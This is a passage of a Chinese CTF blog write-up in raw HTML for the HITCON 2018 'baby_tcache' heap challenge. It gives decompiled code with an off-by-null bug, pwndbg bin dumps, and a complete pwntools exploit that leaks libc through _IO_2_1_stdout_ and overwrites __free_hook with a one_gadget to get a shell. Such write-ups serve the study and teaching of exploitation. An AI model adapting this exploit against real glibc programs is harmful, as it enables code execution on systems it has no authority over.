class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v2) = <span class="built_in">puts</span>(<span class="string">&quot;:(&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !heap[i] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = sub_B27(<span class="string">&quot;Size:&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x2000</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  sub_B88(v5, size);</span><br><span class="line">  v5[size] = <span class="number">0</span>;</span><br><span class="line">  heap[i] = v5;		<span class="comment">//off-by-null</span></span><br><span class="line">  v2 = heap_size;</span><br><span class="line">  heap_size[i] = size;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = sub_B27();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heap[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(heap[v1], <span class="number">0xDA</span>, heap_size[v1]);</span><br><span class="line">    <span class="built_in">free</span>(heap[v1]);</span><br><span class="line">    heap[v1] = <span class="number">0LL</span>;</span><br><span class="line">    heap_size[v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;:)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>保护全开，程序逻辑和功能都很简单，只有add和free两个功能，而且只有一个off-by-null漏洞</p>
+<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>为了满足unlink对fd/bk的检查，最前面的被合并的块需要能够进到unsorted bin来设置其fd/bk，同时为了避免tcache的影响，我们需要一个大块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#6</span></span><br></pre></td></tr></table></figure>
+
+<p>chunk5是后面要用来触发合并的块，chunk1-4是中间用来被合并的块，为了后续的使用所以多夹了几块，同时申请chunk6用来防止和top chunk合并</p>
+<p>到这里为止我们需要用chunk4来修改chunk5的prev size以及inuse位，这个很简单，把chunk4 free掉之后再申请出来就行。</p>
+<p>因为chunk0大于tcache的范围，所以直接free掉它就能进unsorted bin。</p>
+<p>同时块重叠本身的目的就是为了修改中间chunk的内容，所以我们再把chunk1-3也给free掉，要注意的是这时chunk4是不能free掉的，理由很简单，free掉之后chunk5的prev size就被改掉了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x660</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
+
+<p>到此为止实现的效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x55967c335760 ◂— 0x0</span><br><span class="line">0x50 [  1]: 0x55967c3357a0 ◂— 0x0</span><br><span class="line">0x60 [  1]: 0x55967c3357f0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55967c335250 —▸ 0x7fef7531bca0 (main_arena+96) ◂— 0x55967c335250</span><br></pre></td></tr></table></figure>
+
+<p>只需要注意unsorted bin的切分大小就可以实现修改中间块的fd指针</p>
+<p>然后把chunk0从unsorted bin中割走，这样就让chunk1的fd/bk指针指向了unsorted bin的main_arena，我们在割走chunk1的同时就可以部分覆写其fd指针，让其指向<code>_IO_2_1_stdout_</code></p>
+<p>因为我们要让chunk1留在tcache，所以这次把chunk1和chunk2一起割走</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(0x4f0,&#x27;a&#x27;)</span><br><span class="line">add(0x80,&#x27;\x60\x07&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>到此为止实现的效果如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x555555758760</span> —▸ <span class="number">0x7ffff7dd0760</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">1</span>]: <span class="number">0x5555557587a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span> [  <span class="number">1</span>]: <span class="number">0x5555557587f0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555758e30</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5555557587e0</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5555557587e0</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到tcache中0x40（也就是chunk1）的chunk的fd已经被改成了<code>_IO_2_1_stdout_</code>结构体所在的地址，这一过程利用的是已有的main_arena来部分覆写实现的，要注意的是由于ASLR的缘故，<code>_IO_2_1_stdout_</code>的地址其实是有一位需要爆破的，也就是本题中覆写时的<code>\x07</code>的这个0</p>
+<p>接下来就可以把<code>_IO_2_1_stdout_</code>从tcache中申请出来并且覆写其中的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>到这里为止就完成了libc的泄漏，再用同样的方法，割走chunk3的同时修改其fd指针为<code>__free_hook</code>即可</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recv(timeout = <span class="number">0.25</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x4f8</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)	<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x660</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;\x60\x07&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x30</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.recv(<span class="number">8</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7ffff7dd18b0</span> - <span class="number">0x00007ffff79e4000</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;libc_base = &quot;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line">    free_hook = libc_base + (<span class="number">0x7ffff7dd18e8</span> - <span class="number">0x00007ffff79e4000</span>)</span><br><span class="line">    og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">    one = libc_base + og[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,p64(free_hook))</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,p64(one))</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&quot;baby_tcache&quot;</span>)</span><br><span class="line">		pwn()</span><br><span class="line">		p.interactive()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
+              <a href="/tags/tcache/" rel="tag"># tcache</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/12/gdb%E5%8A%A0%E8%BD%BDlibc%E6%BA%90%E7%A0%81/" rel="prev" title="gdb加载libc源码">
+      <i class="fa fa-chevron-left"></i> gdb加载libc源码
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/21/setcontext-orw/" rel="next" title="setcontext+orw">
+      setcontext+orw <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-stashing-unlink-attack"><span class="nav-number">1.</span> <span class="nav-text">tcache stashing unlink attack</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#how2heap%E4%B8%AD%E7%9A%84poc"><span class="nav-number">1.1.</span> <span class="nav-text">how2heap中的poc</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HITCON-2019-one-punch-man"><span class="nav-number">2.</span> <span class="nav-text">HITCON 2019 one_punch_man</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE"><span class="nav-number">2.1.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.2.</span> <span class="nav-text">思路</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HITCON-2018-PWN-baby-tcache"><span class="nav-number">3.</span> <span class="nav-text">HITCON 2018 PWN baby_tcache</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">3.1.</span> <span class="nav-text">思路</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
